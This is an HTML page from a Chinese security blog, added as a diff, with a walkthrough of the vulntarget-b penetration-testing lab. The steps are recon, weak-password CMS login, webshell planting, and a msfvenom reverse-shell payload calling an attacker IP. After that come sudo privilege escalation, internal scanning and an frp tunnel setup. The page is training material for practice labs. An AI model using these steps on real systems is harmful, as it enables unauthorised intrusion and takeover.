@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="此靶场来自于星期五实验室 微信号: Friday_LAB  下载地址百度云链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Hdqkojmu-CeIuPr2gLWHwA 提取码:s4ka Github：https:&#x2F;&#x2F;github.com&#x2F;crow821&#x2F;vulntarget 信息收集 — 外网打点1nmap -T4 -A -sV -v -Pn 192.168.189.146   888">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulntarget-b 靶场">
+<meta property="og:url" content="http://example.com/2021/12/28/vulntarget-b/index.html">
+<meta property="og:site_name" content="杨树林">
+<meta property="og:description" content="此靶场来自于星期五实验室 微信号: Friday_LAB  下载地址百度云链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Hdqkojmu-CeIuPr2gLWHwA 提取码:s4ka Github：https:&#x2F;&#x2F;github.com&#x2F;crow821&#x2F;vulntarget 信息收集 — 外网打点1nmap -T4 -A -sV -v -Pn 192.168.189.146   888">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640682742/Xnip2021-12-28_17-09-55_ew5ggh.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640682756/Xnip2021-12-28_17-10-12_pglkkh.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640682770/Xnip2021-12-28_17-10-31_byzwiy.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640682772/Xnip2021-12-28_17-10-48_r3pr0r.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640682773/Xnip2021-12-28_17-11-41_xz5bvb.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640682846/Xnip2021-12-28_17-13-57_zvbkld.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640683102/Xnip2021-12-28_17-15-21_ngmnkw.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640683103/Xnip2021-12-28_17-18-05_bok8kx.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640683158/Xnip2021-12-28_17-19-08_bgr42p.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640683605/Xnip2021-12-28_17-24-28_odc6ib.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640683639/Xnip2021-12-28_17-24-51_ikee1q.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640683645/Xnip2021-12-28_17-25-25_ibfz8q.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640683704/Xnip2021-12-28_17-25-37_jzo7lf.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640684332/Xnip2021-12-28_17-36-10_wyzexg.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640684340/Xnip2021-12-28_17-35-42_et4wgo.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640684437/Xnip2021-12-28_17-40-28_if07qy.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640685185/Xnip2021-12-28_17-52-47_pqu0lp.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640685200/Xnip2021-12-28_17-51-45_aaasrz.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640685201/Xnip2021-12-28_17-52-17_qsljxb.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640685872/Xnip2021-12-28_18-04-20_qmpssd.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640685930/Xnip2021-12-28_18-05-13_omwbam.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640686120/Xnip2021-12-28_18-06-09_ltevzi.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640686154/Xnip2021-12-28_18-07-49_llces3.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640686156/Xnip2021-12-28_18-08-12_wwz8cl.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640686622/Xnip2021-12-28_18-11-15_nedlax.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640686687/Xnip2021-12-28_18-15-18_m3wirs.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640686702/Xnip2021-12-28_18-15-32_u2grzf.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640686848/Xnip2021-12-28_18-20-31_evbq9d.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640759464/Xnip2021-12-29_14-23-05_eym53d.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640759473/Xnip2021-12-29_14-31-08_nnrxn5.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640760659/Xnip2021-12-29_14-50-42_fj3arx.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640761374/Xnip2021-12-29_15-02-43_gsagsp.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640761346/Xnip2021-12-29_15-01-40_pihhyu.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640761444/Xnip2021-12-29_15-03-53_asqldx.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640761591/Xnip2021-12-29_15-05-56_te9u2b.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640763789/Xnip2021-12-29_15-39-23_s8sbm1.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640763790/Xnip2021-12-29_15-42-37_wyb0yr.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640763864/Xnip2021-12-29_15-44-15_izo19c.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640833078/Xnip2021-12-30_10-34-39_t7fehg.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640833165/Xnip2021-12-30_10-59-17_hgfnyp.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640833323/Xnip2021-12-30_11-01-48_yegdxn.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640833670/Xnip2021-12-30_11-06-06_kmihww.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640833670/Xnip2021-12-30_11-07-41_njugrw.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640833835/Xnip2021-12-30_11-09-45_qv9jli.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640833836/Xnip2021-12-30_11-10-12_jze7eb.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640851677/Xnip2021-12-30_16-06-44_ztt91g.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640851817/Xnip2021-12-30_16-09-38_yeiy5y.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640854894/Xnip2021-12-30_16-25-30_zjlac0.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640855018/Xnip2021-12-30_17-03-10_uyiasu.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640854896/Xnip2021-12-30_17-00-04_v4x1k9.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640855302/Xnip2021-12-30_17-08-12_iqafva.png">
+<meta property="article:published_time" content="2021-12-28T12:20:32.000Z">
+<meta property="article:modified_time" content="2022-02-12T12:39:45.060Z">
+<meta property="article:author" content="lin">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://res.cloudinary.com/lin1109/image/upload/v1640682742/Xnip2021-12-28_17-09-55_ew5ggh.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>vulntarget-b 靶场</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/01/08/ctstudy/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2021/12/11/log4j/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/12/28/vulntarget-b/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/12/28/vulntarget-b/&text=vulntarget-b 靶场"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/12/28/vulntarget-b/&is_video=false&description=vulntarget-b 靶场"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulntarget-b 靶场&body=Check out this article: http://example.com/2021/12/28/vulntarget-b/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/12/28/vulntarget-b/&name=vulntarget-b 靶场&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/12/28/vulntarget-b/&t=vulntarget-b 靶场"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">1.</span> <span class="toc-text">下载地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E2%80%94-%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">信息收集 — 外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8888-%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.1.</span> <span class="toc-text">8888 端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80-%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.</span> <span class="toc-text">80 端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#81-%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.3.</span> <span class="toc-text">81 端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CMS-%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">3.</span> <span class="toc-text">CMS 后台地址泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A4%8D%E7%94%A8-amp-%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">验证码复用 &amp; 后台弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6-getshell"><span class="toc-number">5.</span> <span class="toc-text">后台插件 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-disable-functions"><span class="toc-number">6.</span> <span class="toc-text">绕过 disable_functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">8.</span> <span class="toc-text">内网横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#frp-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">8.1.</span> <span class="toc-text">frp 内网穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A6%85%E9%81%93%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">8.2.</span> <span class="toc-text">内网禅道弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%85%E9%81%93-getshell"><span class="toc-number">8.3.</span> <span class="toc-text">禅道 getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">9.1.</span> <span class="toc-text">域内信息收集</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        vulntarget-b 靶场
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-12-28T12:20:32.000Z" itemprop="datePublished">2021-12-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>此靶场来自于星期五实验室 微信号: Friday_LAB</p>
+</blockquote>
+<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>百度云链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Hdqkojmu-CeIuPr2gLWHwA">https://pan.baidu.com/s/1Hdqkojmu-CeIuPr2gLWHwA</a> 提取码:s4ka</p>
+<p>Github：<a target="_blank" rel="noopener" href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget</a></p>
+<h2 id="信息收集-—-外网打点"><a href="#信息收集-—-外网打点" class="headerlink" title="信息收集 — 外网打点"></a>信息收集 — 外网打点</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sV -v -Pn 192.168.189.146</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682742/Xnip2021-12-28_17-09-55_ew5ggh.png"></p>
+<h3 id="8888-端口"><a href="#8888-端口" class="headerlink" title="8888 端口"></a>8888 端口</h3><p>8888 端口是宝塔面板，不知道安全入口路径，作罢</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682756/Xnip2021-12-28_17-10-12_pglkkh.png"></p>
+<h3 id="80-端口"><a href="#80-端口" class="headerlink" title="80 端口"></a>80 端口</h3><p>80 端口上是一个宝塔的默认页面</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682770/Xnip2021-12-28_17-10-31_byzwiy.png"></p>
+<h3 id="81-端口"><a href="#81-端口" class="headerlink" title="81 端口"></a>81 端口</h3><p>81 端口是极致 cms</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682772/Xnip2021-12-28_17-10-48_r3pr0r.png"></p>
+<p>888 端口没服务，21、22、3306 会不会存在弱口令之后再说，根据以上信息，看起来 81 端口上的极致 cms 比较好欺负一点。先从极致 cms 这里突破吧</p>
+<h2 id="CMS-后台地址泄露"><a href="#CMS-后台地址泄露" class="headerlink" title="CMS 后台地址泄露"></a>CMS 后台地址泄露</h2><p>像这种 cms 一般都有后台，用工具扫一下目录就能得到后台地址</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682773/Xnip2021-12-28_17-11-41_xz5bvb.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.146:81/admin.php/Login/index.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682846/Xnip2021-12-28_17-13-57_zvbkld.png"></p>
+<h2 id="验证码复用-amp-后台弱口令"><a href="#验证码复用-amp-后台弱口令" class="headerlink" title="验证码复用 &amp; 后台弱口令"></a>验证码复用 &amp; 后台弱口令</h2><p>后台验证码存在复用问题，上 burp 测一波弱口令</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683102/Xnip2021-12-28_17-15-21_ngmnkw.png"></p>
+<p>当密码为 admin123 时，返回包中 msg 信息 code&#x3D;0，其它包都是 code&#x3D;1，那么推测 admin123 就是正确密码</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683103/Xnip2021-12-28_17-18-05_bok8kx.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">极致cms后台账户密码	admin/admin123</span><br></pre></td></tr></table></figure>
+
+<p>使用 admin&#x2F;admin123 登录后台</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683158/Xnip2021-12-28_17-19-08_bgr42p.png"></p>
+<h2 id="后台插件-getshell"><a href="#后台插件-getshell" class="headerlink" title="后台插件 getshell"></a>后台插件 getshell</h2><p>搜索一下这个插件</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683605/Xnip2021-12-28_17-24-28_odc6ib.png"></p>
+<p>点击安装</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683639/Xnip2021-12-28_17-24-51_ikee1q.png"></p>
+<p>点击配置</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683645/Xnip2021-12-28_17-25-25_ibfz8q.png"></p>
+<p>设置一个密码</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683704/Xnip2021-12-28_17-25-37_jzo7lf.png"></p>
+<p>再次输入密码之后立即提交即可进入在线编辑器，这里可以对网站源码进行修改</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640684332/Xnip2021-12-28_17-36-10_wyzexg.png"></p>
+<p>写个一句话到 index.php 文件中</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640684340/Xnip2021-12-28_17-35-42_et4wgo.png"></p>
+<p>蚁剑连接</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640684437/Xnip2021-12-28_17-40-28_if07qy.png"></p>
+<p>执行命令发现返回 ret&#x3D;127，应该是宝塔禁用了执行命令的函数</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685185/Xnip2021-12-28_17-52-47_pqu0lp.png"></p>
+<h2 id="绕过-disable-functions"><a href="#绕过-disable-functions" class="headerlink" title="绕过 disable_functions"></a>绕过 disable_functions</h2><p>使用蚁剑自带的插件进行 bypass</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685200/Xnip2021-12-28_17-51-45_aaasrz.png"></p>
+<p>环境变量好像有点问题，执行命令需要加 &#x2F;sbin 去执行</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685201/Xnip2021-12-28_17-52-17_qsljxb.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp  lhost=192.168.189.133 LPORT=6666 -f elf &gt; backdoor.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685872/Xnip2021-12-28_18-04-20_qmpssd.png"></p>
+<p>通过蚁剑上传</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685930/Xnip2021-12-28_18-05-13_omwbam.png"></p>
+<p>msf 配置监听</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686120/Xnip2021-12-28_18-06-09_ltevzi.png"></p>
+<p>执行 backdoor.elf 后门文件</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686154/Xnip2021-12-28_18-07-49_llces3.png"></p>
+<p>msf 获得会话</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686156/Xnip2021-12-28_18-08-12_wwz8cl.png"></p>
+<p>使用 msf 自带的提权辅助模块进行扫描，扫描完之后会给出可用的提权建议<img src="https://res.cloudinary.com/lin1109/image/upload/v1640686622/Xnip2021-12-28_18-11-15_nedlax.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] 192.168.189.146 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.189.146 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.189.146 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.</span><br></pre></td></tr></table></figure>
+
+<p>一个一个挨个试….</p>
+<p>exploit&#x2F;linux&#x2F;local&#x2F;network_manager_vpnc_username_priv_esc 失败</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686687/Xnip2021-12-28_18-15-18_m3wirs.png"></p>
+<p>exploit&#x2F;linux&#x2F;local&#x2F;ptrace_traceme_pkexec_helper 失败</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686702/Xnip2021-12-28_18-15-32_u2grzf.png"></p>
+<p>exploit&#x2F;linux&#x2F;local&#x2F;sudo_baron_samedit 成功</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686848/Xnip2021-12-28_18-20-31_evbq9d.png"></p>
+<p>上面 msf 提权的时候自动创建了一个账户 msf&#x2F;lwxxbhykmkauzty，使用这个账户登录之后是 root 权限</p>
+<h2 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h2><p>双网卡，存在另外一个网段</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640759464/Xnip2021-12-29_14-23-05_eym53d.png"></p>
+<p>使用 fscan 扫一下内网，别问我为啥用 fscan，我是脚本小子，当然也可以用 msf、nmap 扫，但是 fscan 个人认为来的更方便</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640759473/Xnip2021-12-29_14-31-08_nnrxn5.png"></p>
+<p>扫描结果存在 res.txt 中，emmmm ssh 密码被爆出来了 root&#x2F;root，现实情况肯定没这么好的事情</p>
+<p>内网有一台存活主机 192.168.112.128 VULNTARGET\WIN10 并且开放了 8080 端口，fscan 显示为禅道</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640760659/Xnip2021-12-29_14-50-42_fj3arx.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">192.168.112.129:888 open</span><br><span class="line">192.168.112.129:8888 open</span><br><span class="line">192.168.112.129:3306 open</span><br><span class="line">192.168.112.128:3306 open</span><br><span class="line">192.168.112.128:139 open</span><br><span class="line">192.168.112.128:135 open</span><br><span class="line">192.168.112.129:81 open</span><br><span class="line">192.168.112.129:22 open</span><br><span class="line">192.168.112.129:21 open</span><br><span class="line">192.168.112.129:80 open</span><br><span class="line">192.168.112.128:445 open</span><br><span class="line">192.168.112.128:8080 open</span><br><span class="line">[*] WebTitle:http://192.168.112.129:8888 code:302 len:219    title:Redirecting...</span><br><span class="line">[*] WebTitle:http://192.168.112.129:888 code:403 len:548    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://192.168.112.129    code:200 len:18     title:没有找到站点</span><br><span class="line">[*] 192.168.112.128      VULNTARGET\WIN10             </span><br><span class="line">[*] WebTitle:http://192.168.112.129:8888/login code:200 len:24     title:安全入口校验失败</span><br><span class="line">[*] WebTitle:http://192.168.112.129:81 code:200 len:21     title:极致CMS建站系统</span><br><span class="line">[+] 192.168.112.128 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[+] InfoScan:http://192.168.112.129:8888/login [宝塔-BT.cn] </span><br><span class="line">[*] WebTitle:http://192.168.112.128:8080 code:200 len:141    title:None</span><br><span class="line">[+] InfoScan:http://192.168.112.128:8080 [禅道] </span><br><span class="line">[+] SSH:192.168.112.129:22:root root</span><br></pre></td></tr></table></figure>
+
+<h3 id="frp-内网穿透"><a href="#frp-内网穿透" class="headerlink" title="frp 内网穿透"></a>frp 内网穿透</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_ip = 192.168.189.133</span><br><span class="line">bind_port = 7777</span><br></pre></td></tr></table></figure>
+
+<p>启动 frps</p>
